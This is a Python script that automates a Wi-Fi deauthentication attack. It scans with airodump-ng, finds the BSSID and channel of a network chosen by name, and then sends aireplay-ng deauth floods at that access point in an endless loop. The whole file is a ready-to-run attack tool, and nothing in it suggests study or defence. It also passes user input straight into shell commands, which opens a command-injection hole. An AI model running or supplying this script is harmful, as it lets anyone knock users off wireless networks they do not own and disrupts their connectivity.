import subprocess, time, sys









red = "\033[1;31m"

green = "\033[1;32m"









def iwCh( channel, interface ):

    try:

        subprocess.run( f"sudo iwconfig { interface } channel { channel }", shell = True, check = True )

        print( f"\n{ green }Channel is set to { channel } on { interface }!" )

        time.sleep( 2 )

    except:

        print( f"\n{ red }Getting error in setting channel on { interface }!" )

        sys.exit( 0 )









def kiddDeAuth( BSSID, interface ):

    try:

        print( f"\n\n{ red }I am going to kid the wifi right now!\n\n" )

        p = subprocess.Popen( [ "sudo", "aireplay-ng", "-0", "0", "-a", BSSID, interface ] )

        time.sleep( 20 )

        p.terminate()

        p.wait()

        print( f"{ green }\n\nI am going to sleep for a while!\n\n" )

        time.sleep( 60 )

        kiddDeAuth( BSSID, interface )

    except:

        subprocess.run( "sudo rm -rf ./wifiBssid.py ./wifiChannel.py ./wifiInterF.txt", shell = True, check = True )

        print( f"{ red }\nStop sending DeAuth and files created by this script have been deleted!\n" )

        sys.exit( 0 )









def air( IF, ESSID ):

    dic = {}

    try:

        f = open( "wifiInterF.txt", "x" )

    except:

        print( f"\n\n{ red }Error in file creation!\n\n" )

        sys.exit( 0 )

    p = subprocess.Popen( [ "sudo", "airodump-ng", "-i", IF ], stdout = f )

    time.sleep( 10 )

    p.terminate()

    p.wait()

    print( f"\n\n{ green }Capture file has been created!\n\n" )

    subprocess.run( f"""sudo grep -i "{ ESSID }" wifiInterF.txt | awk '!seen[$1]++ {{ bssid = $1; }} END {{ print "b=" bssid; }}' > wifiBssid.py""", shell = True, check = True )

    subprocess.run( f"""sudo grep -i "{ ESSID }" wifiInterF.txt | awk '!seen[$1]++ {{ chnel = $6; }} END {{ print "c=" chnel; }}' > wifiChannel.py""", shell = True, check = True )

    time.sleep( 1 )

    try:

        bFile = open( "wifiBssid.py", "r" )

        cFile = open( "wifiChannel.py", "r" )

        for x in bFile:

            if "=" in x:

                dic[ "bssid" ] = x.split( "=" )[ 1 ] if len( x.split( "=" )[ 1 ] ) > 1 else print( f"\n\n{ red }Bssid can not be assigned, may be there is no name wifi!\n\n" )

            else:

                print( f"\n\n{ red }Variable is not in the file!\n\n" )

                sys.exit( 0 )

        for x in cFile:

            if "=" in x:

                dic[ "channel" ] = x.split( "=" )[ 1 ] if int( x.split( "=" )[ 1 ] ) else print( f"\n\n{ red }Error in assigning channel!\n\n" )

    except:

        print( f"\n\n{ red }wifiBssid or wifiChannel files are not found!\n\n" )

        subprocess.run( "sudo rm -rf ./wifiBssid.py ./wifiChannel.py ./wifiInterF.txt", shell = True, check = True )

        sys.exit( 0 )

    iwCh( dic[ "channel" ], IF )

    kiddDeAuth( dic[ "bssid" ], IF )

air( str( input( f"\n{ green }Interface ( wlan0, wlan0mon, etc... ) : \n" ) ), str( input( f"\n{ green }ESSID or wifi name : \n" ) ) )
